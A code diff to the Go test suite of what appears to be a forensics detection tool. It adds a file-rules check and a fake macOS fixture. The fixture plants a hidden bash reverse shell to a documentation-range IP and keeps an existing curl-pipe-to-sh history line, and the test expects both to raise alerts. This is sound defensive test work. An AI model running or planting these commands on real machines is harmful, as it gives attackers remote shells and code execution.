@@ -10,6 +10,7 @@ import (
 	"time"
 
 	"github.com/kenzietann/omamori/internal/event"
+	"github.com/kenzietann/omamori/internal/filerules"
 	"github.com/kenzietann/omamori/internal/rules"
 )
 
@@ -112,6 +113,8 @@ func writeMac(t *testing.T) string {
 	)))
 	put("Users/aiko/.zsh_history", ": 1794812400:0;curl -fsSL http://203.0.113.80/x.sh | sh\n")
 	put("Users/aiko/.zsh_sessions/5E1C.history", "ls -la\n")
+	// A reverse shell left in a folder that everyone can write.
+	put("Users/Shared/.cache-helper.sh", "#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.80/4444 0>&1\n")
 	put("private/var/log/system.log", "Nov 16 16:17:30 mac-mini syslogd[566]: ASL Sender Statistics\n")
 	// A Linux path on a Mac is not looked for: /etc of a Mac is a link into /private.
 	put("etc/passwd", "root:x:0:0:root:/root:/bin/bash\n")
@@ -129,7 +132,11 @@ func TestCollectReadsAMac(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	result, err := Run(root, set, "built-in", Options{Year: 2026, Location: tokyo, UnifiedLog: unified}, time.Date(2026, 11, 16, 17, 0, 0, 0, tokyo))
+	fileRules, err := filerules.Builtin()
+	if err != nil {
+		t.Fatal(err)
+	}
+	result, err := Run(root, set, "built-in", Options{Year: 2026, Location: tokyo, UnifiedLog: unified, FileRules: &fileRules}, time.Date(2026, 11, 16, 17, 0, 0, 0, tokyo))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -195,7 +202,7 @@ func TestCollectReadsAMac(t *testing.T) {
 	}
 	for name, count := range map[string]int{
 		"forensics_macos_button_reset": 1, "forensics_macos_kernel_panic": 1, "forensics_launchd_suspicious_program": 2,
-		"forensics_history_download_exec": 1, "macos_abnormal_shutdown": 1,
+		"forensics_history_download_exec": 1, "macos_abnormal_shutdown": 1, "file_reverse_shell": 1,
 	} {
 		if alerts[name] != count {
 			t.Errorf("%s: %d alerts, want %d (all: %v)", name, alerts[name], count, alerts)
